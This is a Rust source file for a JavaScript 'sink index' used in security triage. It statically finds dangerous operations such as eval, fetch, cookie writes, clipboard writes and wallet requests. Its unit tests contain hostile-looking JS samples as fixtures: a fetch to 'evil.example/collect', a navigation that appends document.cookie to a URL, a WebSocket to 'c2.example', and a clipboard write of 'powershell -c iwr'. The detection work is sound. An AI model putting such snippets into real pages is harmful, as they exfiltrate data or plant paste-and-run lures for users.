//! Sink index — "the important bits" of a script (JS triage Phase 4).
//!
//! The technique bug-bounty tooling such as jsluice uses on large JavaScript: parse once,
//! find every place the code *does* something dangerous — executes a string, talks to
//! the network, navigates, writes HTML, injects a script, writes the clipboard, signs a
//! wallet request — resolve the argument as far as static analysis honestly can, and
//! report each with the span of the function it sits in. Detection logic can then read
//! the function around a sink instead of a fixed character window, which is the
//! structural fix for proximity heuristics that matched unrelated minified tokens.
//!
//! Argument resolution: string / template literals, `+` concatenation, and identifiers
//! that `oxc_semantic` proves are declared with an initializer and **never written
//! again** (so the initializer is the only value they can hold). Anything else becomes
//! `EXPR`, and `complete` is false. Resolution never executes anything.
//!
//! Offsets are Unicode code-point offsets (what Python string indices are), not UTF-8
//! byte offsets.
use oxc_allocator::Allocator;
use oxc_ast::ast::*;
use oxc_ast::AstKind;
use oxc_ast_visit::{walk, Visit};
use oxc_parser::Parser;
use oxc_semantic::{Scoping, Semantic, SemanticBuilder};
use oxc_span::{GetSpan, SourceType, Span};
use oxc_syntax::scope::ScopeFlags;
use serde::Serialize;

/// Upper bound on sinks reported per script (adversarial scripts can repeat a sink
/// millions of times; the index is evidence, not a full trace).
const MAX_SINKS: usize = 2000;
const MAX_ENDPOINTS: usize = 500;
/// Resolved argument text is truncated to this many characters.
const MAX_ARG_CHARS: usize = 512;
/// Identifier → initializer hops followed while resolving one argument.
const MAX_RESOLVE_DEPTH: u8 = 8;

/// Placeholder for any part of an argument that is not statically known.
pub const EXPR: &str = "EXPR";

/// One dangerous operation found in a script.
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct Sink {
    /// `exec`, `network`, `beacon`, `navigate`, `dom_write`, `src_assign`,
    /// `script_inject`, `form_action`, `href_assign`, `cookie_write`, `storage`,
    /// `clipboard`, `wallet_rpc`.
    pub kind: &'static str,
    /// Dotted path of the callee / assignment target (`window.location.href`,
    /// `?.innerHTML` where the object is not a plain path).
    pub target: String,
    /// The argument that reaches the sink, resolved as far as possible (`EXPR` holes).
    pub arg: Option<String>,
    /// True when `arg` contains no `EXPR` hole.
    pub complete: bool,
    /// Code-point span of the sink expression.
    pub start: u32,
    pub end: u32,
    /// Code-point span of the innermost enclosing function (the whole program at top level).
    pub func_start: u32,
    pub func_end: u32,
}

/// Sink index for one script.
#[derive(Debug, Clone, Serialize, Default)]
pub struct SinkIndex {
    pub sinks: Vec<Sink>,
    /// Distinct resolved URLs / paths reaching a network, navigation or resource sink.
    pub endpoints: Vec<String>,
    /// The parser could not produce an AST (fatal error); the index is empty.
    pub parse_failed: bool,
    /// More sinks existed than `MAX_SINKS`.
    pub truncated: bool,
}

/// Build the sink index for `source`.
#[must_use]
pub fn index(source: &str) -> SinkIndex {
    let allocator = Allocator::default();
    let source_type = SourceType::default().with_script(true);
    let ret = Parser::new(&allocator, source, source_type).parse();
    if ret.fatal_error {
        return SinkIndex { parse_failed: true, ..SinkIndex::default() };
    }
    // Node table is needed to read a symbol's declaration (off by default in 0.152).
    let semantic = SemanticBuilder::new().with_build_nodes(true).build(&ret.program).semantic;
    let offsets = CharOffsets::new(source);
    let mut v = SinkVisitor {
        semantic: &semantic,
        scoping: semantic.scoping(),
        offsets: &offsets,
        funcs: vec![ret.program.span],
        out: SinkIndex::default(),
    };
    v.visit_program(&ret.program);
    let mut out = v.out;
    let mut seen = std::collections::HashSet::new();
    for s in &out.sinks {
        if !matches!(
            s.kind,
            "network" | "beacon" | "navigate" | "src_assign" | "script_inject" | "form_action" | "href_assign"
        ) {
            continue;
        }
        if let Some(a) = &s.arg {
            if looks_like_endpoint(a) && seen.insert(a.clone()) {
                out.endpoints.push(a.clone());
                if out.endpoints.len() >= MAX_ENDPOINTS {
                    break;
                }
            }
        }
    }
    out
}

fn looks_like_endpoint(a: &str) -> bool {
    let a = a.trim();
    a.contains("://") || a.starts_with("//") || (a.starts_with('/') && !a.starts_with("/*"))
}

/// UTF-8 byte offset → code-point offset. Identity for ASCII sources.
struct CharOffsets {
    map: Option<Vec<u32>>,
}

impl CharOffsets {
    fn new(source: &str) -> Self {
        if source.is_ascii() {
            return Self { map: None };
        }
        let mut map = vec![0u32; source.len() + 1];
        let mut chars = 0u32;
        for (i, ch) in source.char_indices() {
            for b in 0..ch.len_utf8() {
                map[i + b] = chars;
            }
            chars += 1;
        }
        map[source.len()] = chars;
        Self { map: Some(map) }
    }

    fn at(&self, byte: u32) -> u32 {
        match &self.map {
            None => byte,
            Some(m) => m.get(byte as usize).copied().unwrap_or(*m.last().unwrap_or(&0)),
        }
    }
}

struct SinkVisitor<'s, 'a> {
    semantic: &'s Semantic<'a>,
    scoping: &'s Scoping,
    offsets: &'s CharOffsets,
    funcs: Vec<Span>,
    out: SinkIndex,
}

struct Resolved {
    text: String,
    complete: bool,
}

impl Resolved {
    fn hole() -> Self {
        Self { text: EXPR.to_string(), complete: false }
    }
    fn lit(s: &str) -> Self {
        Self { text: s.to_string(), complete: true }
    }
}

impl<'s, 'a> SinkVisitor<'s, 'a> {
    fn push(&mut self, kind: &'static str, target: String, arg: Option<&Expression<'a>>, span: Span) {
        if self.out.sinks.len() >= MAX_SINKS {
            self.out.truncated = true;
            return;
        }
        let (arg, complete) = match arg {
            Some(e) => {
                let r = self.resolve(e, 0);
                let mut t = r.text;
                if t.chars().count() > MAX_ARG_CHARS {
                    t = t.chars().take(MAX_ARG_CHARS).collect();
                }
                (Some(t), r.complete)
            }
            None => (None, true),
        };
        let func = self.funcs.last().copied().unwrap_or(span);
        self.out.sinks.push(Sink {
            kind,
            target,
            arg,
            complete,
            start: self.offsets.at(span.start),
            end: self.offsets.at(span.end),
            func_start: self.offsets.at(func.start),
            func_end: self.offsets.at(func.end),
        });
    }

    /// Statically resolve the value of `e`. Never executes anything.
    fn resolve(&self, e: &Expression<'a>, depth: u8) -> Resolved {
        match e {
            Expression::StringLiteral(s) => Resolved::lit(s.value.as_str()),
            Expression::NumericLiteral(n) => Resolved::lit(&number_text(n.value)),
            Expression::TemplateLiteral(t) => {
                let mut text = String::new();
                let mut complete = true;
                for (i, q) in t.quasis.iter().enumerate() {
                    match &q.value.cooked {
                        Some(c) => text.push_str(c.as_str()),
                        None => text.push_str(q.value.raw.as_str()),
                    }
                    if let Some(x) = t.expressions.get(i) {
                        let r = self.resolve(x, depth);
                        complete &= r.complete;
                        text.push_str(&r.text);
                    }
                }
                Resolved { text, complete }
            }
            Expression::BinaryExpression(b) if b.operator == BinaryOperator::Addition => {
                let l = self.resolve(&b.left, depth);
                let r = self.resolve(&b.right, depth);
                Resolved { text: l.text + &r.text, complete: l.complete && r.complete }
            }
            Expression::ParenthesizedExpression(p) => self.resolve(&p.expression, depth),
            Expression::Identifier(id) if depth < MAX_RESOLVE_DEPTH => {
                self.resolve_identifier(id, depth).unwrap_or_else(Resolved::hole)
            }
            _ => Resolved::hole(),
        }
    }

    /// An identifier resolves to its initializer only when it is bound by a simple
    /// `var/let/const NAME = init` and has no write reference anywhere: the initializer
    /// is then the only value it can hold. Globals, parameters, reassigned variables
    /// and destructured bindings stay unknown.
    fn resolve_identifier(&self, id: &IdentifierReference<'a>, depth: u8) -> Option<Resolved> {
        let reference_id = id.reference_id.get()?;
        let symbol_id = self.scoping.get_reference(reference_id).symbol_id()?;
        if self.scoping.get_resolved_references(symbol_id).any(|r| r.is_write()) {
            return None;
        }
        let decl = self.semantic.symbol_declaration(symbol_id);
        let AstKind::VariableDeclarator(d) = decl.kind() else { return None };
        let BindingPattern::BindingIdentifier(bind) = &d.id else { return None };
        if bind.name.as_str() != id.name.as_str() {
            return None;
        }
        let init = d.init.as_ref()?;
        Some(self.resolve(init, depth + 1))
    }
}

fn number_text(v: f64) -> String {
    if v.fract() == 0.0 && v.abs() < 1e15 {
        format!("{}", v as i64)
    } else {
        format!("{v}")
    }
}

/// Dotted path of an expression used as a callee or assignment target. Unknown parts
/// (calls, `this`, computed non-literal keys) become `?`.
fn path_of(e: &Expression<'_>, depth: u8) -> String {
    if depth > 12 {
        return "?".to_string();
    }
    match e {
        Expression::Identifier(id) => id.name.as_str().to_string(),
        Expression::StaticMemberExpression(m) => {
            format!("{}.{}", path_of(&m.object, depth + 1), m.property.name.as_str())
        }
        Expression::ComputedMemberExpression(m) => match &m.expression {
            Expression::StringLiteral(s) => format!("{}.{}", path_of(&m.object, depth + 1), s.value.as_str()),
            _ => format!("{}.?", path_of(&m.object, depth + 1)),
        },
        Expression::ParenthesizedExpression(p) => path_of(&p.expression, depth + 1),
        _ => "?".to_string(),
    }
}

fn target_path(t: &AssignmentTarget<'_>) -> Option<String> {
    match t {
        AssignmentTarget::AssignmentTargetIdentifier(id) => Some(id.name.as_str().to_string()),
        AssignmentTarget::StaticMemberExpression(m) => {
            Some(format!("{}.{}", path_of(&m.object, 0), m.property.name.as_str()))
        }
        AssignmentTarget::ComputedMemberExpression(m) => match &m.expression {
            Expression::StringLiteral(s) => Some(format!("{}.{}", path_of(&m.object, 0), s.value.as_str())),
            _ => None,
        },
        _ => None,
    }
}

/// Strip a leading global-object prefix so `window.fetch` and `fetch` match alike.
fn unprefixed(path: &str) -> &str {
    for p in ["window.", "self.", "globalThis.", "top.", "parent."] {
        if let Some(rest) = path.strip_prefix(p) {
            return rest;
        }
    }
    path
}

fn last_seg(path: &str) -> &str {
    path.rsplit('.').next().unwrap_or(path)
}

fn is_location_path(p: &str) -> bool {
    let p = unprefixed(p);
    p == "location" || p == "document.location" || p == "location.href" || p == "document.location.href"
}

fn arg_expr<'b, 'a>(args: &'b [Argument<'a>], i: usize) -> Option<&'b Expression<'a>> {
    args.get(i).and_then(|a| a.as_expression())
}

fn is_function_like(e: Option<&Expression<'_>>) -> bool {
    matches!(e, Some(Expression::FunctionExpression(_) | Expression::ArrowFunctionExpression(_)))
}

fn string_value<'a>(e: Option<&'a Expression<'_>>) -> Option<&'a str> {
    match e {
        Some(Expression::StringLiteral(s)) => Some(s.value.as_str()),
        _ => None,
    }
}

impl<'s, 'a> Visit<'a> for SinkVisitor<'s, 'a> {
    fn visit_function(&mut self, it: &Function<'a>, flags: ScopeFlags) {
        self.funcs.push(it.span);
        walk::walk_function(self, it, flags);
        self.funcs.pop();
    }

    fn visit_arrow_function_expression(&mut self, it: &ArrowFunctionExpression<'a>) {
        self.funcs.push(it.span);
        walk::walk_arrow_function_expression(self, it);
        self.funcs.pop();
    }

    fn visit_call_expression(&mut self, call: &CallExpression<'a>) {
        let path = path_of(&call.callee, 0);
        let p = unprefixed(&path);
        let args = &call.arguments;
        let a0 = arg_expr(args, 0);
        let a1 = arg_expr(args, 1);
        let span = call.span;
        match p {
            "eval" | "execScript" => self.push("exec", path.clone(), a0, span),
            "Function" => self.push("exec", path.clone(), args.last().and_then(|a| a.as_expression()), span),
            "setTimeout" | "setInterval" if !is_function_like(a0) => {
                self.push("exec", path.clone(), a0, span)
            }
            "fetch" => self.push("network", path.clone(), a0, span),
            "open" => self.push("navigate", path.clone(), a0, span),
            "importScripts" => self.push("script_inject", path.clone(), a0, span),
            "document.write" | "document.writeln" => self.push("dom_write", path.clone(), a0, span),
            "document.execCommand" if string_value(a0).is_some_and(|c| c.eq_ignore_ascii_case("copy")) => {
                self.push("clipboard", path.clone(), None, span)
            }
            "localStorage.setItem" | "sessionStorage.setItem" => self.push("storage", path.clone(), a1, span),
            _ => match last_seg(p) {
                "sendBeacon" => self.push("beacon", path.clone(), a0, span),
                "writeText" | "write" if p.contains("clipboard") => self.push("clipboard", path.clone(), a0, span),
                "assign" | "replace" if p.ends_with("location.assign") || p.ends_with("location.replace") => {
                    self.push("navigate", path.clone(), a0, span)
                }
                // XMLHttpRequest#open(method, url): the receiver is not a window.
                "open" if args.len() >= 2 => self.push("network", path.clone(), a1, span),
                "insertAdjacentHTML" => self.push("dom_write", path.clone(), a1, span),
                "setAttribute" => match string_value(a0).map(str::to_ascii_lowercase).as_deref() {
                    Some("src") => self.push("src_assign", path.clone(), a1, span),
                    Some("href") => self.push("href_assign", path.clone(), a1, span),
                    Some("action" | "formaction") => self.push("form_action", path.clone(), a1, span),
                    Some("srcdoc") => self.push("dom_write", path.clone(), a1, span),
                    _ => {}
                },
                "request" => {
                    // EIP-1193: provider.request({ method: "eth_sendTransaction", ... })
                    if let Some(Expression::ObjectExpression(obj)) = a0 {
                        for prop in &obj.properties {
                            if let ObjectPropertyKind::ObjectProperty(op) = prop {
                                let is_method = matches!(&op.key, PropertyKey::StaticIdentifier(k) if k.name.as_str() == "method");
                                if is_method {
                                    if let Expression::StringLiteral(m) = &op.value {
                                        let m = m.value.as_str();
                                        if m.starts_with("eth_") || m.starts_with("personal_") || m.starts_with("wallet_") {
                                            self.push("wallet_rpc", path.clone(), Some(&op.value), span);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                _ => {}
            },
        }
        walk::walk_call_expression(self, call);
    }

    fn visit_new_expression(&mut self, new_expr: &NewExpression<'a>) {
        let path = path_of(&new_expr.callee, 0);
        let args = &new_expr.arguments;
        match unprefixed(&path) {
            "WebSocket" | "EventSource" => self.push("network", path.clone(), arg_expr(args, 0), new_expr.span),
            "Worker" | "SharedWorker" => self.push("script_inject", path.clone(), arg_expr(args, 0), new_expr.span),
            "Function" => {
                self.push("exec", path.clone(), args.last().and_then(|a| a.as_expression()), new_expr.span)
            }
            _ => {}
        }
        walk::walk_new_expression(self, new_expr);
    }

    fn visit_import_expression(&mut self, it: &ImportExpression<'a>) {
        self.push("script_inject", "import".to_string(), Some(&it.source), it.span);
        walk::walk_import_expression(self, it);
    }

    fn visit_assignment_expression(&mut self, assign: &AssignmentExpression<'a>) {
        if let Some(path) = target_path(&assign.left) {
            let span = assign.span();
            let value = Some(&assign.right);
            if is_location_path(&path) {
                self.push("navigate", path, value, span);
            } else {
                match last_seg(&path) {
                    "innerHTML" | "outerHTML" | "srcdoc" => self.push("dom_write", path, value, span),
                    "src" => self.push("src_assign", path, value, span),
                    "action" | "formAction" => self.push("form_action", path, value, span),
                    "href" => self.push("href_assign", path, value, span),
                    "cookie" if unprefixed(&path) == "document.cookie" => self.push("cookie_write", path, value, span),
                    _ => {}
                }
            }
        }
        walk::walk_assignment_expression(self, assign);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(ix: &SinkIndex) -> Vec<(&'static str, Option<String>, bool)> {
        ix.sinks.iter().map(|s| (s.kind, s.arg.clone(), s.complete)).collect()
    }

    #[test]
    fn resolves_concat_and_const_propagation() {
        let ix = index(r#"const host = "https://ev" + "il.example"; const path = `/c?u=${host}`; fetch(host + "/collect");"#);
        assert_eq!(kinds(&ix), vec![("network", Some("https://evil.example/collect".into()), true)]);
        assert_eq!(ix.endpoints, vec!["https://evil.example/collect".to_string()]);
    }

    #[test]
    fn reassigned_variable_is_not_resolved() {
        // `u` is written after its declaration: its initializer is NOT its only value.
        let ix = index(r#"var u = "https://decoy.example"; u = pick(); fetch(u);"#);
        assert_eq!(kinds(&ix), vec![("network", Some(EXPR.into()), false)]);
        assert!(ix.endpoints.is_empty());
    }

    #[test]
    fn parameters_and_globals_stay_unknown() {
        let ix = index(r#"function go(u){ location.href = u + "?x=" + document.cookie; }"#);
        assert_eq!(ix.sinks.len(), 1);
        assert_eq!(ix.sinks[0].kind, "navigate");
        assert_eq!(ix.sinks[0].arg.as_deref(), Some("EXPR?x=EXPR"));
        assert!(!ix.sinks[0].complete);
    }

    #[test]
    fn template_literal_with_holes() {
        let ix = index(r#"const id = "42"; new WebSocket(`wss://c2.example/s/${id}/${Date.now()}`);"#);
        assert_eq!(ix.sinks[0].arg.as_deref(), Some("wss://c2.example/s/42/EXPR"));
        assert_eq!(ix.endpoints, vec!["wss://c2.example/s/42/EXPR".to_string()]);
    }

    #[test]
    fn enclosing_function_span_is_reported() {
        let src = "function a(){ var x = atob(k); }\nfunction b(){ var s = document.createElement('script'); s.src = 'https://cdn.example/x.js'; document.head.appendChild(s); }";
        let ix = index(src);
        let s = ix.sinks.iter().find(|s| s.kind == "src_assign").expect("src sink");
        let func = &src[s.func_start as usize..s.func_end as usize];
        assert!(func.starts_with("function b()"), "got {func}");
        assert!(!func.contains("atob"));
    }

    #[test]
    fn top_level_sink_reports_program_span() {
        let src = "eval(payload);";
        let ix = index(src);
        assert_eq!((ix.sinks[0].func_start, ix.sinks[0].func_end), (0, src.len() as u32));
    }

    #[test]
    fn code_point_offsets_for_non_ascii_source() {
        // "é" and "€" are multi-byte in UTF-8; offsets must be code points.
        let src = "var t = \"é€\"; eval(t);";
        let ix = index(src);
        let s = &ix.sinks[0];
        let chars: Vec<char> = src.chars().collect();
        let text: String = chars[s.start as usize..s.end as usize].iter().collect();
        assert_eq!(text, "eval(t)");
        assert_eq!(s.arg.as_deref(), Some("é€"));
    }

    #[test]
    fn catalogue_covers_the_sink_families() {
        let src = r#"
            eval("1"); setTimeout("x()", 1); setTimeout(function(){}, 1);
            navigator.sendBeacon("https://b.example/p", d);
            var x = new XMLHttpRequest(); x.open("POST", "https://x.example/api");
            window.open("https://o.example/");
            location.replace("https://r.example/");
            document.write("<script src=//w.example/a.js></script>");
            el.innerHTML = "<b>";
            img.src = "https://i.example/p.gif";
            form.action = "https://f.example/post.php";
            document.cookie = "a=b";
            localStorage.setItem("k", "v");
            navigator.clipboard.writeText("powershell -c iwr");
            document.execCommand("copy");
            ethereum.request({ method: "eth_sendTransaction", params: [] });
            import("https://m.example/mod.js");
            new Worker("/w.js");
        "#;
        let got: Vec<&str> = index(src).sinks.iter().map(|s| s.kind).collect();
        for k in [
            "exec", "beacon", "network", "navigate", "dom_write", "src_assign", "form_action",
            "cookie_write", "storage", "clipboard", "wallet_rpc", "script_inject",
        ] {
            assert!(got.contains(&k), "missing {k}: {got:?}");
        }
        // setTimeout with a function argument is not a string-exec sink.
        assert_eq!(got.iter().filter(|k| **k == "exec").count(), 2);
    }

    #[test]
    fn fatal_parse_error_yields_empty_index() {
        let ix = index("function (");
        assert!(ix.sinks.is_empty());
    }

    #[test]
    fn sink_cap_sets_truncated() {
        let src = "eval(a);".repeat(MAX_SINKS + 10);
        let ix = index(&src);
        assert_eq!(ix.sinks.len(), MAX_SINKS);
        assert!(ix.truncated);
    }
}
